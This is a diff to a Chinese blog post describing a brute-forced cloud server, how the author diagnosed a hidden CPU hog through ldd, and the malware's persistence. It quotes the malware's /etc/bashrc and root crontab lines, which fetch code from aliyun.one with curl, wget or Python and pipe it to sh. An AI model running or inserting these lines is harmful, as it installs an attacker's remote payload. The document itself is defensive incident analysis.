@@ -1,15 +1,13 @@
 服务器被黑事件
 ==============
 
-在 /etc/bashrc 中 ::
+刚买的腾讯云服务器，因为临时测试下性能，所以只是设置了一个简单的密码，结果发现
+被爆破。
 
-    (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;exec(urllib.urlopen("http://aliyun.one/pygo").read())')|sh >/dev/null 2>&1 &
-
-在 /var/spool/cron/root 中 ::
-
-    */15 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen("http://aliyun.one").read())')|sh 
-
-ldd : ::
+登录上服务器，发现 CPU 负载很高，但用 top 命令却无法找到是哪个进程在占用 CPU。
+参考了 `这篇文章 <https://mp.weixin.qq.com/s/1AF5cgo_hJ096LmX7ZHitA>`_ ，使用
+ldd 查看 top 和 ps 的动态链接库，发现 ``/usr/local/lib/libevent_core-0.12.so``
+比较可疑 : ::
 
     # ldd  `which top`
     linux-vdso.so.1 =>  (0x00007ffe21bc7000)
@@ -93,6 +91,18 @@ ldd : ::
     libz.so.1 => /lib64/libz.so.1 (0x00007fdf0c779000)
     libbz2.so.1 => /lib64/libbz2.so.1 (0x00007fdf0c569000)
 
+之后又找到了 `另一篇文章 <https://www.anquanke.com/post/id/171523>`_ ，发现它描
+述的入侵案例和我遇到的一模一样，相关文件如下:
+
+在 /etc/bashrc 中: ::
+
+    (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;exec(urllib.urlopen("http://aliyun.one/pygo").read())')|sh >/dev/null 2>&1 &
+
+在 /var/spool/cron/root 中: ::
+
+    */15 * * * * (curl -fsSL -m180 aliyun.one||wget -q -T180 -O- aliyun.one||python -c 'import urllib;print(urllib.urlopen("http://aliyun.one").read())')|sh 
+
+
 脚本: ::
 
     #<script>window.location.href="http://aliyun.com";</script><!--
@@ -154,9 +164,13 @@ ldd : ::
     done
     #-->
 
+Thanks for reading :)
+
+
 References
 ----------
 
 https://www.anquanke.com/post/id/171523
 
 https://zhuanlan.zhihu.com/p/65609044
+
